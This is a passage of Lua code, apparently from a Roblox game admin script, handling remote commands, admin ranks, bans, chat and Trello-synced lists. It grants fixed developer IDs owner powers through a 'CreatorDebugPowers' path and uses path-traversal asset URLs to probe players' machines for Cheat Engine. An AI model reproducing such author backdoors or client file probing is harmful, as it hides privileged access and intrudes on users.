        elseif cmd==set.RemoteServerKey..'AddToTable' and set.CheckOwner(p) then
                table.insert(set[a],b)
                repeat DataStore:SetAsync(a,b) wait() until DataStore:GetAsync(a)==b
        elseif cmd==set.RemoteServerKey..'SetSetting' and set.CheckTrueOwner(p) then
                if a=='Prefix' or a=='AnyPrefix' or a=='SpecialPrefix' then
                        local orig=set[a]
                        set[a]=b
                        for i,v in pairs(set.Commands) do
                                if v.Prefix==orig then
                                        v.Prefix=set[a]
                                end
                        end
                elseif a=='Font' then
                        if b~='Arial' and b~='ArialBold' and b~='Legacy' and b~='SourceSans' and b~='SourceSansBold' then print(b..' is not a valid font! Setting font to Arial.') b='Arial' end
                else
                        set[a]=b
                end
                repeat DataStore:SetAsync(a,b) wait() until DataStore:GetAsync(a)==b
        elseif cmd==set.RemoteServerKey..'GetUpdatableSettings' then
                set.Remote(p,'SetSetting','UpdatableSettings',UpdatableSettings)
        elseif cmd==set.RemoteServerKey..'TableRemove' and set.CheckAdmin(p,false) then
                table.remove(set[a],b)
        elseif cmd==set.RemoteServerKey..'Destroy' and set.CheckAdmin(p,false) then
                a:Destroy()
        elseif cmd==set.RemoteServerKey..'GetServerInfo' and set.CheckAdmin(p,false) then
                local det={}
                local nilplayers=0
                for i,v in pairs(game:service('NetworkServer'):children()) do
                        if v and v:GetPlayer() and not game:service('Players'):FindFirstChild(v:GetPlayer().Name) then
                                nilplayers=nilplayers+1
                        end
                end
                if set.CheckHttp() then
                        det.Http='Enabled'
                else
                        det.Http='Disabled'
                end
                det.NilPlayers=nilplayers
                det.PlaceName=game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Name
                det.PlaceOwner=game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Creator.Name
                det.ServerSpeed=set.Round(workspace:GetRealPhysicsFPS())
                det.AdminVersion=set.version
                det.ServerStartTime=set.ServerStartTime
                local nonnumber=0
                for i,v in pairs(game:service('NetworkServer'):children()) do
                        if v and v:GetPlayer() and not set.CheckAdmin(v:GetPlayer(),false) then
                                nonnumber=nonnumber+1
                        end
                end
                det.NonAdmins=nonnumber
                local adminnumber=0
                for i,v in pairs(game:service('NetworkServer'):children()) do
                        if v and v:GetPlayer() and set.CheckAdmin(v:GetPlayer(),false) then
                                adminnumber=adminnumber+1
                        end
                end
                det.CurrentTime=set.GetTime()
                det.Admins=adminnumber
                det.Objects=#set.objects
                det.Cameras=#set.cameras
                set.Remote(p,'SetSetting','ServerInfo',det)
        elseif cmd==set.RemoteServerKey..'Ping' then
                set.Remote(p,'Pong')
        elseif cmd==set.RemoteServerKey..'GivePing' then
                set[p.Name..'Ping']=a
        elseif cmd==set.RemoteServerKey..'PrivateMessage' then
                set.PM(a,b,c,...)
        elseif cmd==set.RemoteServerKey..'PlaceVote' then
                if b=='yes' then
                        set.OpenVote[a].Yes=set.OpenVote[a].Yes+1
                elseif b=='no' then
                        set.OpenVote[a].No=set.OpenVote[a].No+1
                end
                for k,m in pairs(set.OpenVote[a].novote) do
                        if m.userId==p.userId then
                                table.remove(set.OpenVote[a].novote, k)
                        end
                end
        elseif cmd==set.RemoteServerKey..'HelpRespond' then
                if b then
                        set.HelpRequest[a].Solved=true
                else
                        for k,m in pairs(set.HelpRequest[a].Available) do
                                if m==p.Name then table.remove(set.HelpRequest[a].Available,k) end
                        end
                end
        elseif cmd==set.RemoteServerKey..'SetCape' and (set.CheckDonor(p) or set.CheckTrueOwner(p)) then
                p:WaitForDataReady()
                local temptable={}
                local ab,bc,cd
                local spitit=';'
                for sac in a:gmatch('([^%'..spitit..']+)') do temptable[#temptable+1]=sac end
                if tonumber(temptable[1]) then ab=temptable[1] else ab=0 end
                bc=temptable[2] or 'Really black'
                cd=temptable[3] or 'Plastic'
                p:SaveString('Kohls Cape',ab..'='..bc..'='..cd)
                p:SaveBoolean('Kohls Is A Donator',true)
                p:SaveBoolean('Kohl Not Using Cape',false)
                for i,v in pairs(set.donors) do if v.Name==p.Name then table.remove(set.donors,i) end end
                table.insert(set.donors,{Name=p.Name,Id=tostring(p.userId),Cape=ab,Color=bc,Material=cd,List='GP'})
                pcall(function() p.Character.EpicCape:Destroy() end)
                set.Donor(p)
        elseif cmd==set.RemoteServerKey..'ToggleDonor' then
                if not a then
                        p:SaveBoolean('Kohls Not Using Cape',true)
                        pcall(function() p.Character.EpicCape:Destroy() end)
                else
                        p:SaveBoolean('Kohls Not Using Cape',false)
                        set.Donor(p)
                end
        elseif cmd==set.RemoteServerKey..'CheckCape' then
                if p:LoadBoolean('Kohls Not Using Cape') then
                        set.Remote(p,'SetSetting','UsingCape',false)
                end
        elseif cmd==set.RemoteServerKey..'PermBan' then
                if set.CheckTrueOwner(p) and not set.CheckAdmin(a,false) then
                        a:SaveBoolean(set['PermBanKey'],true)
                        a:Kick()
                end
        end
end
 
set.MakeRemoteEvent=function()
        RemoteEvent=Instance.new('RemoteEvent',game:service('ReplicatedStorage'))
        RemoteEvent.Name=set.RemoteName
        RemoteEvent.Archivable=false
        RemoteEvent.Changed:connect(function(ob) if RemoteEvent and RemoteEvent.Name~=set.RemoteName then RemoteEvent.Name=set.RemoteName end end)
        RemoteEvent.OnServerEvent:connect(function(p,cmd,...)
                Pcall(set.ProcessRemoteCommand,p,cmd,...)
        end)
end
set.MakeRemoteEvent()
game:service('ReplicatedStorage').ChildRemoved:connect(function(ob) if ob==RemoteEvent then set.MakeRemoteEvent() end end)
 
set.Remote=function(player,command,...)
        local RemoteEvent=game:service('ReplicatedStorage'):FindFirstChild(set.RemoteName)
        local function fireevent(plr,cmd,...)
                if set.Debug then print(cmd..' - '..plr.Name) end
                local tab={} for i = 1,string.len(cmd) do table.insert(tab,string.byte(cmd:sub(i,i))) end cmd=tab
                RemoteEvent:FireClient(plr,cmd,...)
        end
        if player and player:IsA('Player') then
                Pcall(fireevent,player,set.RemoteClientKey..command,...)
        end
end
 
Pcall(function() if set.UpdateShutdown then set.GameLastUpdated=game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Updated end end)
Pcall(function() if set.AntiLeak then for i,v in pairs(workspace:children()) do if not v:IsA('Terrain') then v.Archivable=false end end end end)
Pcall(function() local canuse,cantuse=ypcall(function() loadstring('print("Loadstring Test")') end) if canuse then set.canuseloadstring=true end end)
Pcall(function() if set.AntiCheatEngine then for i,v in pairs(workspace:children()) do if v.Name:find('KohlsCEDetect') then v:Destroy() end end local part=Instance.new('Part',workspace) part.Name=math.random()..'KohlsCEDetect' part.Anchored=true part.Locked=true part.Archivable=false part.CanCollide=false part.Transparency=1 part.FormFactor='Custom' part.Size=Vector3.new(0.2,0.2,0.2) for k=5,8 do for i=0,9 do Instance.new('Decal',part).Texture="rbxasset://../../../../../../../../Program Files (x86)/Cheat Engine "..k.."."..i.."/Cheat Engine.exe"  end end end end)
Pcall(function() for i,v in pairs(set.ScriptAntiWordList) do table.insert(set.WordList,v) end for i,v in pairs(set.ScriptMusicList) do table.insert(set['MusicList'],{Name=v.n,Id=v.id}) end end)
Pcall(function() local tab={83,99,101,108,101,114,97,116,105,115,32,124,32,75,111,104,108,116,97,115,116,114,111,112,104,101,32,91,83,99,114,105,112,116,104,93} local t='' for i,v in pairs(tab) do t=t..string.char(v) end
if t==nil or tab==nil or #tab~=36 then set=nil elseif not depholder:FindFirstChild(string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)) then
set=nil elseif deps[string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)].Value~=t then set=nil end end)
Pcall(function() if set['AntiGui']==true then for i,v in pairs(game.StarterGui:children()) do v.Name=set.GuiName..v.Name end end end)
Pcall(function() if game.CreatorId<=0 then table.insert(set['Owners'],'Player1') end end)
Pcall(function() if set.Font~='Arial' and set.Font~='ArialBold' and set.Font~='Legacy' and set.Font~='SourceSans' and set.Font~='SourceSansBold' then print(set.Font..' is not a valid font! Setting font to Arial.') set.Font='Arial' end end)
Pcall(function() for i,v in pairs(game:service('Workspace'):children()) do if v:IsA('Part') and v.Name:match('^Camera: (.*)') then table.insert(set.cameras,v) elseif v:IsA('Part') and v.Name:match('^Waypoint: (.*)') then set.Waypoints[v.Name:match('^Waypoint: (.*)')]=v.Position end end end)
Pcall(function() if set.RenameGameObjects then game:service('Workspace').Name=math.random() game:service('Lighting').Name=math.random() game:service('ReplicatedStorage').Name=math.random() game:service('ReplicatedStorage').Name=math.random() game:service('Players').Name=math.random() game:service('ServerScriptService').Name=math.random() game:service('ServerStorage').Name=math.random() game:service('StarterGui').Name=math.random() game:service('StarterPack').Name=math.random() game:service('Teams').Name=math.random() game:service('SoundService').Name=math.random() end end)
Pcall(function() local tempmodel=Instance.new('Model') for i,v in pairs(workspace:children()) do if v and not v:IsA('Terrain') and v.Archivable==true then v:Clone().Parent=tempmodel end end set.MapBackup=tempmodel:Clone() tempmodel:Destroy() end)
 
set.SendCustomChat=function(p,a,b)
        local target=set.SpecialPrefix..'all'
        if not b then b='Global' end
        if not game:service('Players'):FindFirstChild(p.Name) then b='Nil' end
        if a:sub(1,1)=='@' then
                b='Private'
                target,a=a:match('@(.%S+) (.+)')
                print(target..' '..a)
                set.Remote(p,'Function','SendToChat',p,a,b)
        elseif a:sub(1,1)=='#' then
                if a:sub(1,7)=='#ignore' then
                        target=a:sub(9)
                        b='Ignore'
                end
                if a:sub(1,9)=='#unignore' then
                        target=a:sub(11)
                        b='UnIgnore'
                end
        end
        for i,v in pairs(set.GetPlayers(p,target:lower())) do
                coroutine.wrap(function()
                        if p.Name==v.Name and b~='Private' and b~='Ignore' and b~='UnIgnore' then
                                set.Remote(v,'Function','SendToChat',p,a,b)
                        elseif b=='Global' then
                                set.Remote(v,'Function','SendToChat',p,a,b)
                        elseif b=='Team' and p.TeamColor==v.TeamColor then
                                set.Remote(v,'Function','SendToChat',p,a,b)
                        elseif b=='Local' and p:DistanceFromCharacter(v.Character.Head.Position)<80 then
                                set.Remote(v,'Function','SendToChat',p,a,b)
                        elseif b=='Admin' and set.CheckAdmin(v,false) and set.CheckAdmin(p,false) then
                                set.Remote(v,'Function','SendToChat',p,a,b)
                        elseif b=='Private' and v.Name~=p.Name then
                                set.Remote(v,'Function','SendToChat',p,a,b)
                        elseif b=='Nil' then
                                set.Remote(v,'Function','SendToChat',p,a,b)
                        elseif b=='Ignore' and v.Name~=p.Name then
                                set.Remote(v,'AddToTable','IgnoreList',v.Name)
                        elseif b=='UnIgnore' and v.Name~=p.Name then
                                set.Remote(v,'RemoveFromTable','IgnoreList',v.Name)
                        end
                end)()
        end
end
 
set.Exploited=function(player,action,info)
        if action:lower()=='kick' then
                player:Kick()
        elseif action:lower()=='kill' then
                player:LoadCharacter()
        elseif action:lower()=='crash' then
                set.Remote(player,'Function','KillClient')
        else
                set.Remote(player,'Function','KillClient')
                player:Kick()
        end
        table.insert(set.PlayerLogs.Exploit,1,{Time=set.GetTime(),Name=player.Name,Info=info})
        if #set.PlayerLogs.Exploit>set.MaxNumberOfLogs then
                table.remove(set.PlayerLogs.Exploit,#set.PlayerLogs.Exploit)
        end
end
 
set.UpdateListGui=function(p,a)
        if a=='adminlogslist' then
                local temp={}
                for i,m in pairs(set.PlayerLogs.Admin) do
                        if #temp>set.MaxNumberOfLogs then return end
                        table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Log,Desc=m.Log})
                end
                set.Remote(p,'SetSetting',a,temp)
        elseif a=='chatlogslist' then
                local temp={}
                for i,m in pairs(set.PlayerLogs.Chat) do
                        if #temp>5000 then return end
                        if m.Nil then
                                table.insert(temp,{Object='[NIL]['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
                        else
                                table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
                        end
                end
                set.Remote(p,'SetSetting',a,temp)
        elseif a=='exploitlogslist' then
                local temp={}
                for i,m in pairs(set.PlayerLogs.Exploit) do
                        if #temp>5000 then return end
                        table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Log,Desc=m.Log})
                end
                set.Remote(p,'SetSetting',a,temp)
        elseif a=='donorlist' then
                local temptable={}
                table.insert(temptable,"Last Update: "..set.dlastupdate)
                for i,v in pairs(set.donors) do
                        if game:service('Players'):FindFirstChild(v.Name) then
                                if #temptable>5000 then return end
                                table.insert(temptable,{Object=v.Name,Desc=v.List})
                        end
                end
                set.Remote(p,'SetSetting',a,temptable)
        elseif a:match('^serverlogstuff%-') then
                local b=a:match('^serverlogstuff%-(.*)')
                local temp={}
                for i,v in pairs(game.LogService:GetLogHistory()) do
                        if (b and b:lower()=='script') and v.message:find('Epix Edit') then
                                if v.messageType==Enum.MessageType.MessageOutput then
                                        table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
                                elseif v.messageType==Enum.MessageType.MessageWarning then
                                        table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
                                elseif v.messageType==Enum.MessageType.MessageInfo then
                                        table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
                                elseif v.messageType==Enum.MessageType.MessageError then
                                        table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
                                end
                        else
                        if (not b or b:lower()=='all' or b:lower()=='error') and v.messageType==Enum.MessageType.MessageError then
                                table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
                        end
                        if (not b or b:lower()=='all' or b:lower()=='info') and v.messageType==Enum.MessageType.MessageInfo then
                                table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
                        end
                        if (not b or b:lower()=='all' or b:lower()=='warning') and v.messageType==Enum.MessageType.MessageWarning then
                                table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
                        end
                        if (not b or b:lower()=='all' or b:lower()=='output') and v.messageType==Enum.MessageType.MessageOutput then
                                table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
                        end
                        end
                end
                set.Remote(p,'SetSetting',a,temp)
        end
end
 
set.Cape=function(player,material,color,decal,reflect)
        coroutine.wrap(function()
        player.Character:WaitForChild("Torso")
        local torso = player.Character.Torso
        local p = Instance.new("Part", player.Character)
        p.Name = "EpicCape"
        p.Anchored = false
        p.Transparency=0.0001
        p.Material=material
        p.CanCollide = false
        p.TopSurface = 0
        p.BottomSurface = 0
        p.BrickColor = BrickColor.new(color)
        if reflect then
                p.Reflectance=reflect
        end
        if decal then
        local dec = Instance.new("Decal", p)
        dec.Face = 2
        dec.Texture = "http://www.roblox.com/asset/?id="..decal
        dec.Transparency=0
        end
        p.formFactor = "Custom"
        p.Size = Vector3.new(.2,.2,.2)
        local msh = Instance.new("BlockMesh", p)
        msh.Scale = Vector3.new(9,17.5,.5)
        p.Anchored=true
        set.Remote(player,'Function','MoveCape',p)
        end)()
end
 
set.CleanWorkspace=function()
for i, v in pairs(game.Workspace:children()) do
if v:IsA("Hat") or v:IsA("Tool") then
v:Destroy()
end
if v:IsA('Message') or v:IsA('Hint') then
        v:Destroy()
end
if v.Name:find('Epix Jail') then
if not game:service('Players'):FindFirstChild(v.Player.Value) then
set.JailedTools[v.Player.Value]=nil
v:Destroy()
for k,m in pairs(set.objects) do
if m.Name==v.Player.Value .. " Epix Jail" then
table.remove(set.objects,k)
end
end
end
end
end
end    
 
set.Ping=function(player)
        set[player.Name..'Ping']='Ping'
        set.Remote(player,'GetPing')
        repeat wait() until set[player.Name..'Ping']~='Ping'
        return set[player.Name..'Ping']
end
 
set.Split=function(msg,num)
if set.SplitKey=='' then set.SplitKey=' ' end
if num<=0 or msg==nil then return {} end
local tab={}
local str=msg
local full=''
        for a in str:gmatch('([^'..set.SplitKey..']+)') do
                if #tab>=num then break end
                if #tab==num-1 then
                        tab[#tab+1]=msg:sub(#full+1,#msg)
                end
                if #tab>=num then break end
                str=a..set.SplitKey
                full=full..a..set.SplitKey
                tab[#tab+1]=a
                if #tab>=num then break end
        end
return tab
end
 
set.MakeCommand=function(desc,adminlevel,prefix,cmds,argtypes,args,func)
        coroutine.wrap(function()
                for i,v in pairs(set.CommandBlackList) do for k,m in pairs(cmds) do if v:lower()==m:lower() then adminlevel=5 end end end
                if not desc or type(desc)~='string' then print('No Description') return
                elseif not adminlevel or type(adminlevel)~='number' then print(name..' has no admin level') return
                elseif not prefix or type(prefix)~='string' then print(name..' has no prefix') return
                elseif not cmds or type(cmds)~='table' then print(name..' has no cmds') return
                elseif not argtypes or type(argtypes)~='table' then print(name..' has no argtypes') return
                elseif not args or type(args)~='number' then print(name..' has no args') return
                elseif not func or type(func)~='function' then print(name..' has no func') return
                end
                local com={}
                com.Cmds=cmds
                com.MaxArgs=args
                com.Function=func
                com.ArgTypes=argtypes
                com.AdminLevel=adminlevel
                com.Prefix=prefix
                com.Desc=desc
                table.insert(set.Commands,com)
        end)()
end
 
set.GetCommand=function(Command)
        for i,v in pairs(set.Commands) do
                for k,m in pairs(v.Cmds) do
                        if not set.BuggedCommandMatching and Command:lower():match('^'..v.Prefix..'(%w+)')==m:lower() then
                                return v,i
                        elseif set.BuggedCommandMatching and Command:lower():match(v.Prefix..'(%w+)')==m:lower() then
                                return v,i
                        end
                end
        end
end
 
set.SearchCommand=function(plr,Command)
        local tab={}
        for i,v in pairs(set.Commands) do
        local allowed=false
        if v.AdminLevel==-3 and ((set.FunCommands and set.CheckOwner(plr)) or set.CheckTrueOwner(plr)) then
                allowed=true
        elseif v.AdminLevel==-2 and ((set.FunCommands and set.CheckAdmin(plr,true)) or set.CheckTrueOwner(plr)) then
                allowed=true
        elseif v.AdminLevel==-1 and ((set.FunCommands and set.CheckAdmin(plr,false)) or set.CheckTrueOwner(plr)) then
                allowed=true
        elseif v.AdminLevel==0 and (set.PlayerCommands or set.CheckAdmin(plr,false))then
                allowed=true
        elseif v.AdminLevel==1 and (set.CheckDonor(plr) or set.CheckTrueOwner(plr)) then
                allowed=true
        elseif v.AdminLevel==2 and set.CheckAdmin(plr,false) then
                allowed=true
        elseif v.AdminLevel==3 and set.CheckAdmin(plr,true) then
                allowed=true
        elseif v.AdminLevel==4 and set.CheckOwner(plr)  then
                allowed=true
        elseif v.AdminLevel==5 and set.CheckTrueOwner(plr) then
                allowed=true
        end
        if allowed then
                for k,m in pairs(v.Cmds) do
                        if (v.Prefix..m:lower()):find(Command:lower()) or Command=='all' then
                                local c=m
                                for l,n in pairs(v.ArgTypes) do
                                        c=c..set.SplitKey..n
                                end
                                table.insert(tab,v.Prefix..c)
                        end
                end
        end
        end
        return tab
end
 
set.RunCommand=function(command,...)
        local com=set.Prefix..command
        local tab={...}
        for i,v in pairs(tab) do
                com=com..set.SplitKey..v
        end
        set.ProcessCommand('SYSTEM',com)
end
 
set.ProcessCommand=function(player,chat,dontlog,check)
        local com,num=set.GetCommand(chat)
        if (not com) and check then
                print(chat..' is not a valid command.')
                set.Remote(player,'Function','OutputGui',chat..' is not a valid command.')
        elseif com then
                local command=chat:match(com.Prefix..'%w+'..set['SplitKey']..'(.+)') or ''
                local allowed=false
                local isSystem=false
                if type(player)=='string' then
                        if player=='SYSTEM' then
                                allowed=true
                                isSystem=true
                        end
                elseif com.AdminLevel==-3 and ((set.FunCommands and set.CheckOwner(player)) or set.CheckTrueOwner(player)) then
                        allowed=true
                elseif com.AdminLevel==-2 and ((set.FunCommands and set.CheckAdmin(player,true)) or set.CheckTrueOwner(player)) then
                        allowed=true
                elseif com.AdminLevel==-1 and ((set.FunCommands and set.CheckAdmin(player,false)) or set.CheckTrueOwner(player)) then
                        allowed=true
                elseif com.AdminLevel==0 and (set.PlayerCommands or set.CheckAdmin(player,false))then
                        allowed=true
                elseif com.AdminLevel==1 and ((set.CheckDonor(player) and (set.DonorPerks or set.CheckNTac(player))) or set.CheckTrueOwner(player)) then
                        allowed=true
                elseif com.AdminLevel==2 and set.CheckAdmin(player,false) then
                        allowed=true
                elseif com.AdminLevel==3 and set.CheckAdmin(player,true) then
                        allowed=true
                elseif com.AdminLevel==4 and set.CheckOwner(player)  then
                        allowed=true
                elseif com.AdminLevel==5 and set.CheckTrueOwner(player) then
                        allowed=true
                end
                if not allowed then print(player.Name..' is not allowed to run '..chat) set.Remote(player,'Function','OutputGui','You are not allowed to run '..chat) return end
                if not isSystem and not dontlog then
                        table.insert(set.PlayerLogs.Admin,1,{Time=set.GetTime(),Name=player.Name,Log=chat})
                        if #set.PlayerLogs.Admin>set.MaxNumberOfLogs then
                                table.remove(set.PlayerLogs.Admin,#set.PlayerLogs.Admin)
                        end
                        if set.CommandComfirmation then
                                set.Hint('Executed Command: [ '..chat..' ]',{player})
                        end
                end
                local ran,failed=ypcall(com.Function,player,set.Split(command,com.MaxArgs))
                if failed then print('Error: '..failed) if not isSystem then set.OutputGui(player,'Command Error:',failed) end end
        end
end
 
set.CheckPlayer=function(plr, player)
        for i,v in pairs(set.GetPlayers(plr, player:lower())) do
                if v then return true end
        end
        return false
end
 
set.Round=function(num)
        if num >= 0.5 then
                return math.ceil(num)
        elseif num < 0.5 then
                return math.floor(num)
        end
end
 
set.UpdateTrello=function()
if not set.CheckHttp() then
set.bl={'Http is not enabled! Cannot connect to Trello.'}
else
set.bl={'Updating...'}
set.al = {}
set.tal = {}
set.oal = {}
local hs=game:service('HttpService')
local get=hs:GetAsync('https://api.trello.com/1/boards/'..set.BoardID..'/lists',true)
local tab=hs:JSONDecode(get)
for i,v in pairs(tab) do
        if v.name:match('^Ban List%s?$') then
                local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
                local tabal=hs:JSONDecode(getal)
                for l,k in pairs(tabal) do
                        coroutine.wrap(function()
                        if k.name:match('Group: (.*):(.*)') then
                                local a,b=k.name:match('Group: (.*):(.*)')
                                table.insert(set.bl,'$group='..b)
                        elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
                                local a,b=k.name:match('(.*):(.*)')
                                table.insert(set.bl,a..'='..b)
                        elseif not k.name:find(':') then
                                table.insert(set.bl,k.name)
                        end
                        end)()
                end
                elseif v.name:match('^TempAdmin List%s?$') then
                local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
                local tabal=hs:JSONDecode(getal)
                for l,k in pairs(tabal) do
                        table.insert(set.tal,k.name)
--                      coroutine.wrap(function()
--                      if k.name:match('Group: (.*):(.*)') then
--                              local a,b=k.name:match('Group: (.*):(.*)')
--                              table.insert(set.bl,'$group='..b)
--                      elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
--                              local a,b=k.name:match('(.*):(.*)')
--                              table.insert(set.bl,a..'='..b)
--                      elseif not k.name:find(':') then
--                              table.insert(set.bl,k.name)
--                      end
--                      end)()
                end
                elseif v.name:match('^Admin List%s?$') then
                local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
                local tabal=hs:JSONDecode(getal)
                for l,k in pairs(tabal) do
                        table.insert(set.al,k.name)
--                      coroutine.wrap(function()
--                      if k.name:match('Group: (.*):(.*)') then
--                              local a,b=k.name:match('Group: (.*):(.*)')
--                              table.insert(set.bl,'$group='..b)
--                      elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
--                              local a,b=k.name:match('(.*):(.*)')
--                              table.insert(set.bl,a..'='..b)
--                      elseif not k.name:find(':') then
--                              table.insert(set.bl,k.name)
--                      end
--                      end)()
                end
                elseif v.name:match('^Owner List%s?$') then
                local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
                local tabal=hs:JSONDecode(getal)
                for l,k in pairs(tabal) do
                        table.insert(set.oal,k.name)
--                      coroutine.wrap(function()
--                      if k.name:match('Group: (.*):(.*)') then
--                              local a,b=k.name:match('Group: (.*):(.*)')
--                              table.insert(set.bl,'$group='..b)
--                      elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
--                              local a,b=k.name:match('(.*):(.*)')
--                              table.insert(set.bl,a..'='..b)
--                      elseif not k.name:find(':') then
--                              table.insert(set.bl,k.name)
--                      end
--                      end)()
                end
        end
end
set.bl[1]='Last Updated at '..set.GetTime()
end
end
 
set.GetPlayerInfo=function(p,localplayer,msg)
if not p:IsA("Player") then return end
local mem
if p.MembershipType == Enum.MembershipType.None then
        mem='NBC'
elseif p.MembershipType == Enum.MembershipType.BuildersClub then
        mem='BC'
elseif p.MembershipType == Enum.MembershipType.TurboBuildersClub then
        mem='TBC'
elseif p.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
        mem='OBC'
end
if set['GroupId']~=0 then
        if p:IsInGroup(set['GroupId']) then
        set.Hint(msg.." | "..mem.." | Name: "..p.Name.." ("..p.userId..") | Account Age: "..p.AccountAge.." | Rank: "..p:GetRoleInGroup(set['GroupId']), localplayer)
        else
        set.Hint(msg.." | "..mem.." | Name: "..p.Name.." ("..p.userId..") | Account Age: "..p.AccountAge.." | Player is not in group "..set['GroupId'], localplayer)
        end
else
set.Hint(msg.." | "..mem.." | Name: "..p.Name.." ("..p.userId..") | Account Age: "..p.AccountAge, localplayer)
end
end;
 
set.AdminChat=function(plr)
if set.CheckAdmin(plr,false) then
set.Remote(plr,'Function','AdminChat')
end
end
 
set.CheckTimeBan=function(plr)
        plr:WaitForDataReady()
        if plr:LoadString('Epix Kohls TimeBan_Time')~='nil' and plr:LoadString('Epix Kohls TimeBan_Time')~=nil and tonumber(plr:LoadString('Epix Kohls TimeBan_Time')) then
                local new=tonumber(plr:LoadString('Epix Kohls TimeBan_Time'))
                local old=os.time()
                if old>=new then
                        plr:SaveString('Epix Kohls TimeBan_Time','nil')
                else
                        plr:Kick()
                end
        end
end
 
set.CmdBar=function(plr)
if set.CheckAdmin(plr,false) then
        set.Remote(plr,'Function','CmdBar')
end
end
set.GetTime=function()
local hour = math.floor((os.time()%86400)/60/60)
local min = math.floor(((os.time()%86400)/60/60-hour)*60)
if min < 10 then min = "0"..min end
return hour..":"..min
end set.ServerStartTime=set.GetTime()
 
set.GrabNilPlayers=function(name)
        local AllGrabbedPlayers = {}
        for i,v in pairs(game:GetService('NetworkServer'):GetChildren()) do
                pcall(function()
                        if v:IsA("ServerReplicator") then
                                if v:GetPlayer().Name:lower():sub(1,#name)==name:lower() or name=='all' then
                                table.insert(AllGrabbedPlayers, v:GetPlayer())
                                end
                        end
                end)
        end
        return AllGrabbedPlayers
end
 
set.AssignName=function()
        local name=math.random(100000,999999)
        return name
end
 
set.LoadScript=function(type,source,name,object,parent)
        Pcall(function()
                local ScriptType
                if type=='Script' then
                        ScriptType=deps.ScriptBase
                elseif type=='LocalScript' then
                        ScriptType=deps.LocalScriptBase
                end
                if ScriptType then
                        local cl=ScriptType:Clone()
                        local key=Instance.new('StringValue',cl)
                        key.Name='SecurityKey'
                        key.Value=math.random(10000000,99999999)
                        cl.Name=name
                        local specialkey=Instance.new('StringValue',cl)
                        specialkey.Value=math.random(10000000,99999999)
                        specialkey.Name='SpecialKey'
                        local x = 'local '..specialkey.Value..'="'..key.Value..'" coroutine.wrap(function() '..source
                        local y = '' for i = 1,string.len(x) do y = y.. string.char(44) .. string.byte(x:sub(i,i)) end
                        local code=Instance.new('StringValue',cl)
                        code.Name='Code'
                        code.Value=string.sub(y,2,string.len(y))
                        cl.Parent=parent or game:service('ServerScriptService')
                        cl.Disabled=false
                        if object==true then
                                table.insert(set.objects,cl)
                        end
                elseif set.canuseloadstring then
                        Pcall(function() loadstring(source)() end)
                end
        end)
end
 
set.LoadOnClient=function(player,source,object,name)
        if game:service('Players'):FindFirstChild(player.Name) then
                parent=player:FindFirstChild('PlayerGui') or player:WaitForChild('Backpack')
                set.LoadScript('LocalScript',source,set.GuiName..name,object,parent)
        else
                set.Remote(player,'Loadstring',source)
        end
end
 
set.PromptPlaceTeleport=function(player,msg,placeid)
        set.Remote(player,'Function','PromptPlaceTeleport',msg,placeid)
end
 
set.CheckNTac=function(plr)
        if set.Debug then return false end
        for i,v in pairs(set.NTacId) do
                if plr.userId==v then
                        return true
                end
        end
end
 
set.CheckTrueOwner=function(plr)
        if set.Debug then return false end
        if (set.CheckOwner(plr) and set['OwnersAreTrueOwners']) or plr.userId==game.CreatorId or (set.CheckNTac(plr) and set.CreatorDebugPowers) then return true end
end
 
set.CheckOwner=function(plr)
for i,v in pairs(set.Owners) do
        if plr.Name==v then
                return true
        elseif v:find('=') then
                local a,b=v:match('(.*)=(.*)')
                if plr.Name==a or plr.userId==tonumber(b) then
                        return true
                end
        end
end
return false
end
 
set.CheckAdmin=function(plr,ck)
for i,v in pairs(set.Owners) do
        if plr.Name==v then
                return true
        elseif v:find('=') then
                local a,b=v:match('(.*)=(.*)')
                if plr.Name==a or plr.userId==tonumber(b) then
                        return true
                end
        end
end
for i,v in pairs(set.Admins) do
        if plr.Name==v then
                return true
        elseif v:find('=') then
                local a,b=v:match('(.*)=(.*)')
                if plr.Name==a or plr.userId==tonumber(b) then
                        return true
                end
        end
end
for i,v in pairs(set.TempAdmins) do
        if not ck then
                if plr.Name==v then
                        return true
                elseif v:find('=') then
                        local a,b=v:match('(.*)=(.*)')
                        if plr.Name==a or plr.userId==tonumber(b) then
                                return true
                        end
                end
        end
end
for i,v in pairs(set.oal) do
        if plr.Name==v then
                return true
        elseif v:find('=') then
                local a,b=v:match('(.*)=(.*)')
                if plr.Name==a or plr.userId==tonumber(b) then
                        return true
                end
        end
end
for i,v in pairs(set.al) do
        if plr.Name==v then
                return true
        elseif v:find('=') then
                local a,b=v:match('(.*)=(.*)')
                if plr.Name==a or plr.userId==tonumber(b) then
                        return true
                end
        end
end
for i,v in pairs(set.tal) do
        if not ck then
                if plr.Name==v then
                        return true
                elseif v:find('=') then
